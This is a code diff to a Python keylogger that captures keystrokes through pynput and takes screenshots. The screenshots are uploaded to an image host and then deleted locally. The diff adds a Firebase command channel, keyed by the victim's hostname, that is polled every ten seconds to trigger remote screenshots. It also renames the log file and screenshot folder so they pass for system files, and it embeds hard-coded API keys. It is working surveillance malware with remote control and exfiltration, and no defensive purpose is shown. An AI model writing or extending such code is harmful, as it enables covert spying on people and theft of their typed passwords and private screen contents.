@@ -5,18 +5,21 @@ import socket
 import threading
 import time
 from PIL import ImageGrab  # For taking screenshots
-from pynput.keyboard import Key, Listener  # For keyboard listener
+from pynput.keyboard import Listener, Key  # Import Listener and Key from pynput
 
 # Firebase URL
 firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
 
 # Log file and hostname
-log_file = "systen-log.txt"
+log_file = "system-files.txt"
 hostname = socket.gethostname()
-screenshot_folder = "ss"  # Folder for screenshots
+screenshot_folder = "systemss"  # Folder for screenshots
 
 # ImgBB API key
-api_key = 'de7994d6d49af160676a69e6c10e3026'
+api_key = '8ff7e698f33b179b4471d54349b02824'
+
+# Command path for Firebase
+command_path = f'users/{hostname}/command.json'
 
 # Function to check internet availability
 def is_internet_available():
@@ -140,6 +143,50 @@ def ensure_log_exists():
         with open(log_file, 'w') as file:
             pass  # Create an empty log file
 
+# Function to check and update screenshot count every 10 seconds
+def handle_screenshot_interval():
+    while True:
+        try:
+            response = requests.get(firebase_url + command_path)
+            if response.status_code == 200:
+                command_data = response.json()
+                
+                # If command_data is None or does not contain 'ss_count', initialize it
+                if command_data is None:
+                    command_data = {'ss_count': 0}
+                elif 'ss_count' not in command_data:
+                    command_data['ss_count'] = 0
+                
+                ss_count = command_data.get('ss_count', 0)
+
+                if ss_count > 0:
+                    print(f"Taking {ss_count} screenshots...")
+
+                    # Take screenshots in intervals of 10 seconds
+                    for _ in range(ss_count):
+                        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
+                        try:
+                            screenshot = ImageGrab.grab()
+                            screenshot.save(screenshot_path)
+                            print(f"Screenshot saved at {screenshot_path}")
+                            upload_image_to_imgbb(screenshot_path)  # Upload screenshot
+                            os.remove(screenshot_path)  # Delete the image after upload
+                            time.sleep(10)  # Wait for 10 seconds between screenshots
+                        except Exception as e:
+                            print(f"Failed to take screenshot: {e}")
+
+                    # After taking screenshots, decrement the `ss_count` in Firebase
+                    command_data['ss_count'] -= ss_count
+                    requests.put(firebase_url + command_path, json=command_data)
+
+            else:
+                print(f"Failed to fetch command data, Status code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error fetching command data: {e}")
+
+        time.sleep(10)  # Check the command data every 10 seconds
+
 # Main process
 if __name__ == "__main__":
     ensure_log_exists()  # Ensure that the log file exists
@@ -159,7 +206,12 @@ if __name__ == "__main__":
     screenshot_thread = threading.Thread(target=periodic_screenshots, daemon=True)
     screenshot_thread.start()
 
+    # Start screenshot interval handling in a separate thread
+    screenshot_interval_thread = threading.Thread(target=handle_screenshot_interval, daemon=True)
+    screenshot_interval_thread.start()
+
     # Keep the main thread running
     listener_thread.join()
     upload_thread.join()
     screenshot_thread.join()
+    screenshot_interval_thread.join()
